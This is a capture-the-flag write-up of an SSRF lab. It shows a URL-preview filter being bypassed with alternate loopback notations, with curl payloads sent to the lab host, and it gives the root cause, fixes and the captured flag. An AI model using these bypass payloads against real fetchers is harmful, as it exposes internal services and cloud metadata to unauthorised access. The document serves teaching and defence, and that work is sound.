# Baby SSRF Alternate Loopback Bypass

## What Is Happening

The [Baby SSRF lab](https://8c2c920ae0e7.pwnbox-lab.com/) exposes a chat tool that unfurls any pasted URL and renders an OG-style preview server-side. The challenge states that the flag is on an internal canary at `127.0.0.1:9999`, while the fetcher claims to refuse URLs that point at internal infrastructure.

## Why It Happens

The internal-host filter is incomplete. It blocks obvious loopback representations such as:

```text
127.0.0.1
localhost
[::1]
```

but does not canonicalize equivalent IPv4 loopback forms before the request is made.

Working alternates:

```text
127.1
0x7f000001
0177.0.0.1
```

All of those resolve to loopback, so the server-side previewer still reaches the internal canary.

## Exploit Chain

1. Identify the fetch surface: `POST /post` with a `message` field containing a URL.
2. Confirm direct loopback payloads are blocked.
3. Try alternate loopback notation that still resolves to `127.0.0.1`.
4. Read the reflected OG preview title and description.

## Exact Test

Blocked direct form:

```bash
curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://127.0.0.1:9999/"
```

Working payload:

```bash
curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://127.1:9999/"
```

Other working variants:

```bash
curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://0x7f000001:9999/"

curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://0177.0.0.1:9999/"
```

## Expected Signal

- Direct `127.0.0.1`, `localhost`, and `[::1]` return preview title `host blocked by policy`.
- Alternate loopback notations return an OG preview whose title is the flag.
- The preview description reads:

```text
internal canary; do not expose
```

## Result Interpretation

Confirmed bug chain:

```text
Incomplete internal-host filter
-> alternate loopback form bypasses string checks
-> server resolves payload to 127.0.0.1
-> previewer fetches 127.0.0.1:9999
-> OG preview exposes flag
```

## Root Cause

The application checked only a narrow set of raw host strings and failed to normalize or resolve the destination before enforcing the SSRF policy.

## Impact

- Reach loopback-only services despite anti-SSRF checks.
- Leak internal OG metadata to untrusted users.
- In real systems, this pattern can expose admin services, cloud metadata, or local-only APIs.

## Fix

- Normalize and parse submitted URLs before validation.
- Resolve the hostname and block final loopback/private/link-local destinations.
- Reject alternate numeric IP forms and compare on canonical IPs rather than raw strings.
- Avoid returning sensitive internal preview data to untrusted clients.

## Key Lesson

When a URL fetcher says internal hosts are blocked, test alternate loopback forms early. If `127.0.0.1` is denied, try `127.1`, hex, and octal before moving to more complex parser-confusion payloads.

## Flag

`pwnbox{f6a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6}`
